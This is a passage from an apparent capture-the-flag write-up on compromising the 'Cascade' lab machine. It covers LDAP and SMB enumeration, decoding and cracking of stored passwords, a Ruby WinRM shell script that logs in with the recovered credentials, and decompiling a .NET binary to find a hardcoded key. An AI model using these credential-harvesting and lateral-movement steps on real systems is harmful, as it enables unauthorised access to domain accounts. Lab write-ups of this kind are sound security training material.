objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
instanceType: <span style="color:#ae81ff">4</span>
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: <span style="color:#ae81ff">24610</span>
memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
uSNChanged: <span style="color:#ae81ff">295010</span>
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA<span style="color:#f92672">==</span>
userAccountControl: <span style="color:#ae81ff">66048</span>
badPwdCount: <span style="color:#ae81ff">0</span>
codePage: <span style="color:#ae81ff">0</span>
countryCode: <span style="color:#ae81ff">0</span>
badPasswordTime: <span style="color:#ae81ff">132247339091081169</span>
lastLogoff: <span style="color:#ae81ff">0</span>
lastLogon: <span style="color:#ae81ff">132247339125713230</span>
pwdLastSet: <span style="color:#ae81ff">132230718862636251</span>
primaryGroupID: <span style="color:#ae81ff">513</span>
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA<span style="color:#f92672">==</span>
accountExpires: <span style="color:#ae81ff">9223372036854775807</span>
logonCount: <span style="color:#ae81ff">2</span>
sAMAccountName: r.thompson
sAMAccountType: <span style="color:#ae81ff">805306368</span>
userPrincipalName: r.thompson@cascade.local
objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>
msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
</code></pre></div><p>The string seems to be base64 encoded. Once decoded, we grab the first password !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;clk0bjVldmE=&#34;</span> | base64 -d
rY4n5eva%
</code></pre></div><br/>
<h3 id="smb-shares--first-escalation">SMB Shares &amp; first escalation</h3>
<p>Now that we have a first domain access, we can look at SMB shares.
Let&rsquo;s start by listing them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> -L //10.10.10.182                 
Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  Audit$          Disk      
  C$              Disk      Default share
  Data            Disk      
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share 
  print$          Disk      Printer Drivers
  SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
</code></pre></div><p>In addition to the classic shares, we can notice the presence of <code>Data</code> and <code>Audit$</code>. It turns out that the <code>Audit$</code> share is not available at the moment.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> //10.10.10.182/Audit$
Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\*</span>
</code></pre></div><p>For <code>Data</code>, we can connect and browse it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;r.thompson&#34;</span> //10.10.10.182/Data
Enter WORKGROUP<span style="color:#ae81ff">\r</span>.thompson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">27</span> 04:27:34 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">27</span> 04:27:34 <span style="color:#ae81ff">2020</span>
  Contractors                         D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:11 <span style="color:#ae81ff">2020</span>
  Finance                             D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:06 <span style="color:#ae81ff">2020</span>
  IT                                  D        <span style="color:#ae81ff">0</span>  Tue Jan <span style="color:#ae81ff">28</span> 19:04:51 <span style="color:#ae81ff">2020</span>
  Production                          D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:18 <span style="color:#ae81ff">2020</span>
  Temps                               D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">13</span> 02:45:15 <span style="color:#ae81ff">2020</span>

    <span style="color:#ae81ff">13106687</span> blocks of size 4096. <span style="color:#ae81ff">7794590</span> blocks available
</code></pre></div><p>Few elements are available. We can only gather 4 files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\A</span>rk AD Recycle Bin<span style="color:#ae81ff">\&gt;</span> get ArkAdRecycleBin.log 
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\A</span>rk AD Recycle Bin<span style="color:#ae81ff">\A</span>rkAdRecycleBin.log of size <span style="color:#ae81ff">1303</span> as ArkAdRecycleBin.log <span style="color:#f92672">(</span>3.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 7.9 KiloBytes/sec<span style="color:#f92672">)</span>

smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\D</span>Cs<span style="color:#ae81ff">\&gt;</span> get dcdiag.log 
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\D</span>Cs<span style="color:#ae81ff">\d</span>cdiag.log of size <span style="color:#ae81ff">5967</span> as dcdiag.log <span style="color:#f92672">(</span>14.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 10.2 KiloBytes/sec<span style="color:#f92672">)</span>

smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;VNC Install.reg&#34;</span>
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\V</span>NC Install.reg of size <span style="color:#ae81ff">2680</span> as VNC Install.reg <span style="color:#f92672">(</span>6.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 6.3 KiloBytes/sec<span style="color:#f92672">)</span>

smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\E</span>mail Archives<span style="color:#ae81ff">\&gt;</span> get Meeting_Notes_June_2018.html 
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\E</span>mail Archives<span style="color:#ae81ff">\M</span>eeting_Notes_June_2018.html of size <span style="color:#ae81ff">2522</span> as Meeting_Notes_June_2018.html <span style="color:#f92672">(</span>6.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 7.4 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>The <code>Meeting_Notes_June_2018.html</code> file gives a crucial information, the presence of a temporary account, having the same password as the administrator and having been deleted some time ago.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">From: Steve Smith
To: IT <span style="color:#f92672">(</span>Internal<span style="color:#f92672">)</span>
Sent: <span style="color:#ae81ff">14</span> June <span style="color:#ae81ff">2018</span> 14:07
Subject: Meeting Notes

For anyone that missed yesterday’s meeting <span style="color:#f92672">(</span>I’m looking at you Ben<span style="color:#f92672">)</span>. Main points are below:

-- New production network will be going live on Wednesday so keep an eye out <span style="color:#66d9ef">for</span> any issues.
-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of <span style="color:#ae81ff">2018</span> once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin <span style="color:#f92672">(</span>password is the same as the normal admin account password<span style="color:#f92672">)</span>.
-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.

Steve
</code></pre></div><p>The <code>ArkAdRecycleBin.log</code> file shows that the <code>ArkSvc</code> account is used to manage the <code>Recycle Bin</code>. Logs also show that the <code>Test</code> and <code>TempAdmin</code> accounts have been removed, or at least moved.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat FILES/ArkAdRecycleBin.log 
1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Error: Access is denied
1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">5</span>
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Moving object to AD recycle bin CN<span style="color:#f92672">=</span>Test,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Successfully moved object. New location CN<span style="color:#f92672">=</span>Test<span style="color:#ae81ff">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">0</span> 
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Validating settings...
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Moving object to AD recycle bin CN<span style="color:#f92672">=</span>TempAdmin,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Successfully moved object. New location CN<span style="color:#f92672">=</span>TempAdmin<span style="color:#ae81ff">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span> Exiting with error code <span style="color:#ae81ff">0</span>
</code></pre></div><p>The <code>VNC Install.reg</code> file is also very interesting since it is a VNC configuration file. It allows to recover a password, encrypted (&ldquo;Password&rdquo;=hex:6b,cf,2a,4b,6e,5a,ca,0f).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat VNC<span style="color:#ae81ff">\ </span>Install.reg 
��Windows Registry Editor Version 5.00

<span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\T</span>ightVNC<span style="color:#ae81ff">\S</span>erver<span style="color:#f92672">]</span>
<span style="color:#e6db74">&#34;ExtraPorts&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#e6db74">&#34;QueryTimeout&#34;</span><span style="color:#f92672">=</span>dword:0000001e
<span style="color:#e6db74">&#34;QueryAcceptOnTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;LocalInputPriorityTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000003
<span style="color:#e6db74">&#34;LocalInputPriority&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;BlockRemoteInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;BlockLocalInput&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;IpAccessControl&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#e6db74">&#34;RfbPort&#34;</span><span style="color:#f92672">=</span>dword:0000170c
<span style="color:#e6db74">&#34;HttpPort&#34;</span><span style="color:#f92672">=</span>dword:000016a8
<span style="color:#e6db74">&#34;DisconnectAction&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;AcceptRfbConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;UseVncAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;UseControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;RepeatControlAuthentication&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;LoopbackOnly&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;AcceptHttpConnections&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;LogLevel&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;EnableFileTransfers&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;RemoveWallpaper&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;UseD3D&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;UseMirrorDriver&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;EnableUrlParams&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
<span style="color:#e6db74">&#34;AlwaysShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;NeverShared&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;DisconnectClients&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;PollingInterval&#34;</span><span style="color:#f92672">=</span>dword:000003e8
<span style="color:#e6db74">&#34;AllowLoopback&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;VideoRecognitionInterval&#34;</span><span style="color:#f92672">=</span>dword:00000bb8
<span style="color:#e6db74">&#34;GrabTransparentWindows&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;SaveLogToAllUsersPath&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;RunControlInterface&#34;</span><span style="color:#f92672">=</span>dword:00000001
<span style="color:#e6db74">&#34;IdleTimeout&#34;</span><span style="color:#f92672">=</span>dword:00000000
<span style="color:#e6db74">&#34;VideoClasses&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#e6db74">&#34;VideoRects&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
</code></pre></div><p>However, the passwords used by VNC are known to be weak. It is possible to decrypt them using different tools.
For this machine, I used a small Windows utility called <code>vncpwd.exe</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\v</span>ncpwd&gt;vncpwd.exe 6bcf2a4b6e5aca0f

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format <span style="color:#f92672">(</span>or longer than <span style="color:#ae81ff">8</span> chars<span style="color:#f92672">)</span>

  Password:   sT333ve2

  Press RETURN to exit
</code></pre></div><p>A second password ! Given this and the names of the users, it is likely to be <code>s.smith</code>. Now it gets interesting! Remember, during enumeration, we saw that <code>s.smith</code> and <code>arksvc</code> are member of the <code>Remote Management Users</code> group. It means that they enough privilege to connect remotely using WinRM!</p>
<p>So we get back our little ruby script, and then&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">require <span style="color:#e6db74">&#39;winrm&#39;</span>

conn <span style="color:#f92672">=</span> WinRM::Connection.new<span style="color:#f92672">(</span> 
  endpoint: <span style="color:#e6db74">&#39;http://10.10.10.182:5985/wsman&#39;</span>,
  user: <span style="color:#e6db74">&#39;CASCADE.LOCAL\s.smith&#39;</span>,
  password: <span style="color:#e6db74">&#39;sT333ve2&#39;</span>,
<span style="color:#f92672">)</span>

command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>

conn.shell<span style="color:#f92672">(</span>:powershell<span style="color:#f92672">)</span> <span style="color:#66d9ef">do</span> |shell|
    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit\n&#34;</span> <span style="color:#66d9ef">do</span>
        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
        command <span style="color:#f92672">=</span> gets        
        output <span style="color:#f92672">=</span> shell.run<span style="color:#f92672">(</span>command<span style="color:#f92672">)</span> <span style="color:#66d9ef">do</span> |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts <span style="color:#e6db74">&#34;Exiting with code #{output.exitcode}&#34;</span>
end

</code></pre></div><p>A sweet user shell! =)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_s.smith.rb 
PS &gt; whoami
cascade<span style="color:#ae81ff">\s</span>.smith
PS &gt; pwd

Path                      
----                      
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>ocuments


PS &gt; type ../Desktop/user.txt
a0**REDACTED**
</code></pre></div><br/>
<h3 id="audit-share-reversing--new-account">Audit$ share, reversing &amp; new account</h3>
<p>Having a new and more privilegied account, the <code>Audit$</code> SMB becomes available.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;s.smith&#34;</span> //10.10.10.182/Audit$
Enter WORKGROUP<span style="color:#ae81ff">\s</span>.smith<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:01:26 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:01:26 <span style="color:#ae81ff">2020</span>
  CascAudit.exe                       A    <span style="color:#ae81ff">13312</span>  Tue Jan <span style="color:#ae81ff">28</span> 22:46:51 <span style="color:#ae81ff">2020</span>
  CascCrypto.dll                      A    <span style="color:#ae81ff">12288</span>  Wed Jan <span style="color:#ae81ff">29</span> 19:00:20 <span style="color:#ae81ff">2020</span>
  DB                                  D        <span style="color:#ae81ff">0</span>  Tue Jan <span style="color:#ae81ff">28</span> 22:40:59 <span style="color:#ae81ff">2020</span>
  RunAudit.bat                        A       <span style="color:#ae81ff">45</span>  Wed Jan <span style="color:#ae81ff">29</span> 00:29:47 <span style="color:#ae81ff">2020</span>
  System.Data.SQLite.dll              A   <span style="color:#ae81ff">363520</span>  Sun Oct <span style="color:#ae81ff">27</span> 07:38:36 <span style="color:#ae81ff">2019</span>
  System.Data.SQLite.EF6.dll          A   <span style="color:#ae81ff">186880</span>  Sun Oct <span style="color:#ae81ff">27</span> 07:38:38 <span style="color:#ae81ff">2019</span>
  x64                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 23:25:27 <span style="color:#ae81ff">2020</span>
  x86                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 23:25:27 <span style="color:#ae81ff">2020</span>

    <span style="color:#ae81ff">13106687</span> blocks of size 4096. <span style="color:#ae81ff">7794393</span> blocks available
</code></pre></div><p>Several interesting elements there. Let&rsquo;s dump the entire share</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\&gt;</span> mask <span style="color:#e6db74">&#34;&#34;</span>
smb: <span style="color:#ae81ff">\&gt;</span> recurse ON
smb: <span style="color:#ae81ff">\&gt;</span> mget *
Get file CascAudit.exe? y
getting file <span style="color:#ae81ff">\C</span>ascAudit.exe of size <span style="color:#ae81ff">13312</span> as CascAudit.exe <span style="color:#f92672">(</span>25.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 25.3 KiloBytes/sec<span style="color:#f92672">)</span>
Get file CascCrypto.dll? y
getting file <span style="color:#ae81ff">\C</span>ascCrypto.dll of size <span style="color:#ae81ff">12288</span> as CascCrypto.dll <span style="color:#f92672">(</span>28.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 26.7 KiloBytes/sec<span style="color:#f92672">)</span>
Get directory DB? y
Get file Audit.db? y
getting file <span style="color:#ae81ff">\D</span>B<span style="color:#ae81ff">\A</span>udit.db of size <span style="color:#ae81ff">24576</span> as Audit.db <span style="color:#f92672">(</span>56.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 36.1 KiloBytes/sec<span style="color:#f92672">)</span>
Get file RunAudit.bat? y
getting file <span style="color:#ae81ff">\R</span>unAudit.bat of size <span style="color:#ae81ff">45</span> as RunAudit.bat <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 27.8 KiloBytes/sec<span style="color:#f92672">)</span>
Get file System.Data.SQLite.dll? y
getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.dll of size <span style="color:#ae81ff">363520</span> as System.Data.SQLite.dll <span style="color:#f92672">(</span>318.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 140.2 KiloBytes/sec<span style="color:#f92672">)</span>
Get file System.Data.SQLite.EF6.dll? y
getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.EF6.dll of size <span style="color:#ae81ff">186880</span> as System.Data.SQLite.EF6.dll <span style="color:#f92672">(</span>105.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 127.3 KiloBytes/sec<span style="color:#f92672">)</span>
Get directory x64? y
Get file SQLite.Interop.dll? y
getting file <span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1639936</span> as SQLite.Interop.dll <span style="color:#f92672">(</span>457.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 269.9 KiloBytes/sec<span style="color:#f92672">)</span>
Get directory x86? y
Get file SQLite.Interop.dll? y
getting file <span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1246720</span> as SQLite.Interop.dll <span style="color:#f92672">(</span>422.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 309.8 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>First thing, an SQLite database</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3027002</span>
</code></pre></div><p>Using SQLite Browser, the file can be opened. The <code>DeletedUserAudit</code> table contains entries related to the previously seen deleted users. The LDAP table contains the login information of the account used by the service, <code>ArcSvc</code> !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">id | uname  | pwd                      | domain
<span style="color:#ae81ff">1</span>  | ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw<span style="color:#f92672">==</span> | cascade.local
</code></pre></div><p>The password is encrypted. From there, it reminds me another compromised box&hellip; Nest =).
The service probably uses the database information to connect to the domain. Thus, it must use a function to decrypt the password.</p>
<p>It turns out that the binary is written in <code>C# (.NET)</code>. Perfect! This will make things much easier&hellip; &ldquo;Reverse&rdquo; time!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file CascAudit.exe 
CascAudit.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> Mono/.Net assembly, <span style="color:#66d9ef">for</span> MS Windows
</code></pre></div><p>I used <code>dnSpy</code> to decompile the application. Overall, it&rsquo;s easier it looks at first glance.
In the <code>main</code>, we can see the little piece of code used for decryption and authentication.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqliteDataReader.Read<span style="color:#f92672">()</span>;
str <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Uname&#34;</span><span style="color:#f92672">])</span>;
str2 <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Domain&#34;</span><span style="color:#f92672">])</span>;
string encryptedString <span style="color:#f92672">=</span> Conversions.ToString<span style="color:#f92672">(</span>sqliteDataReader<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Pwd&#34;</span><span style="color:#f92672">])</span>;
try
<span style="color:#f92672">{</span>
  password <span style="color:#f92672">=</span> Crypto.DecryptString<span style="color:#f92672">(</span>encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
catch <span style="color:#f92672">(</span>Exception ex<span style="color:#f92672">)</span>
<span style="color:#f92672">{</span>
  Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Error decrypting password: &#34;</span> + ex.Message<span style="color:#f92672">)</span>;
  <span style="color:#66d9ef">return</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>It then calls the decryption function, using an hardcoded key&hellip; Smells good huh ?
